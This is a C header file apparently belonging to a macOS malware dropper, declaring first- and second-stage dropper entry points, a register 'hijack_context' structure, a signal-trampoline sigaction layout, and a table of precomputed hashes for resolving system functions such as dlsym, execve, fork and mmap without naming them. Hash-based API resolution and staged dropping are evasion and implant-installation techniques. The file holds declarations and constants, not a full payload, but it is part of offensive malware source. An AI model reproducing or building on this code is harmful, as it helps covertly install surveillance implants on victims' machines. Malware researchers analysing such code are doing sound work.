#ifndef RCSMACDROPPER_H
#define RCSMACDROPPER_H

#ifdef WIN32
#pragma once
#include <Windows.h>
#endif

//
// Type of strings
//
#define STRING_SYMBOL 0x0001
#define STRING_DATA   0x0002

extern void dropperStart ();
extern void labelTest ();
extern void firstStageDropper ();
extern void secondStageDropper (unsigned long args);
extern void dropperEnd ();


typedef struct  __user32_sigaction {
	// actual usermode handler, we're not gonna use it 
	unsigned int sig_action;
	// signal trampoline in normal circumstance this is _sigtramp
	// http://opensource.apple.com/source/Libc/Libc-583/i386/sys/_sigtramp.s
	unsigned int sig_tramp;
	unsigned int sig_mask;
	unsigned int sig_flags;
} u32_sigaction;


typedef struct _sigaction {
	unsigned long sig_action; 
	unsigned long sa_mask;
	int     sa_flags;
} sigaction;

typedef struct _hijack_context {
	unsigned long edi;
	unsigned long esi;
	unsigned long ebp;
	unsigned long esp;
	unsigned long ebx;
	unsigned long edx;
	unsigned long ecx;
	unsigned long eax;
} hijack_context;

/*
	unsigned int libSystemHash              = 0x7e38c256; // /usr/lib/libSystem.B.dylib
	unsigned int libDyldHash                = 0x7c7cc5a8; // /usr/lib/system/libdyld.dylib
	unsigned int libsystemcHash             = 0x80b1a6ae; // /usr/lib/system/libsystem_c.dylib (Lion)
	unsigned int libsystemkHash             = 0xf1c2beb6; // /usr/lib/system/libsystem_kernel.dylib (Lion)

	// libdyld.dylib
	unsigned int dlsymHash                  = 0x9cc75880; // _dlsym
	unsigned int dyld_image_countHash       = 0x9100a119; // __dyld_image_count
	unsigned int dyld_get_image_nameHash    = 0x1327d26a; // __dyld_get_image_name
	unsigned int dyld_get_image_headerHash  = 0xe8cdb2cc; // __dyld_get_image_header

	// libsystem_kernel.dylib
	unsigned int openHash     = 0x98b7a5e9; // _open
	unsigned int lseekHash    = 0xfae127c5; // _lseek
	unsigned int closeHash    = 0x56dcb9f9; // _close
	unsigned int chdirHash    = 0x974cca09; // _chdir
	unsigned int writeHash    = 0xb989adc0; // _write
	unsigned int pwriteHash   = 0xac6aa4ce; // _pwrite
	unsigned int statHash     = 0x54c725f3; // _stat
	unsigned int mmapHash     = 0x3a2bd4ee; // _mmap
	unsigned int munmapHash   = 0x29d6b975; // _munmap
	unsigned int mkdirHash    = 0xca1cf250; // _mkdir
	unsigned int execveHash   = 0x9ca3dfdf; // _execve

	// libsystem_c.dylib
	unsigned int memcpyHash   = 0xb7ac6156; // _memcpy
	unsigned int sprintfHash  = 0xf771588d; // _sprintf
	unsigned int printfHash   = 0xb885c098; // _printf
	unsigned int getenvHash   = 0x794bed96; // _getenv
	unsigned int execlHash    = 0x80aa1fc;  // _execl
	unsigned int forkHash     = 0xf58942e1; // _fork
	unsigned int strncpyHash  = 0x335645d0; // _strncpy
	unsigned int mallocHash   = 0x7de19fc7; // _malloc
	unsigned int freeHash     = 0xf6f66e2b; // _free
	unsigned int sleepHash    = 0x90a80b98; // _sleep
//unsigned int sigactionHash = 0xa5bdf188; // _sigaction
*/

#define linkeditHash	0xf51f49c4	// __LINKEDIT

#define sigactionHash	0xa5bdf188
#define libSystemHash	0x7e38c256 // /usr/lib/libSystem.B.dylib
#define libDyldHash		0x7c7cc5a8 // /usr/lib/system/libdyld.dylib
#define libsystemcHash	0x80b1a6ae // /usr/lib/system/libsystem_c.dylib (Lion)
#define libsystemkHash	0xf1c2beb6 // /usr/lib/system/libsystem_kernel.dylib (Lion)

// libdyld.dylib
#define dlsymHash					0x9cc75880 // _dlsym
#define dyld_image_countHash		0x9100a119 // __dyld_image_count
#define dyld_get_image_nameHash		0x1327d26a // __dyld_get_image_name
#define dyld_get_image_headerHash	0xe8cdb2cc // __dyld_get_image_header

// libsystem_kernel.dylib
#define openHash	0x98b7a5e9 // _open
#define lseekHash	0xfae127c5 // _lseek
#define closeHash	0x56dcb9f9 // _close
#define chdirHash	0x974cca09 // _chdir
#define writeHash	0xb989adc0 // _write
#define pwriteHash	0xac6aa4ce // _pwrite
#define statHash	0x54c725f3 // _stat
#define mmapHash	0x3a2bd4ee // _mmap
#define munmapHash	0x29d6b975 // _munmap
#define mkdirHash	0xca1cf250 // _mkdir
#define execveHash	0x9ca3dfdf // _execve

// libsystem_c.dylib
#define memcpyHash	0xb7ac6156 // _memcpy
#define sprintfHash	0xf771588d // _sprintf
#define printfHash	0xb885c098 // _printf
#define getenvHash	0x794bed96 // _getenv
#define execlHash	0x80aa1fc  // _execl
#define forkHash	0xf58942e1 // _fork
#define strncpyHash	0x335645d0 // _strncpy
#define mallocHash	0x7de19fc7 // _malloc
#define freeHash	0xf6f66e2b // _free
#define sleepHash	0x90a80b98 // _sleep


#endif //RCSMACDROPPER_H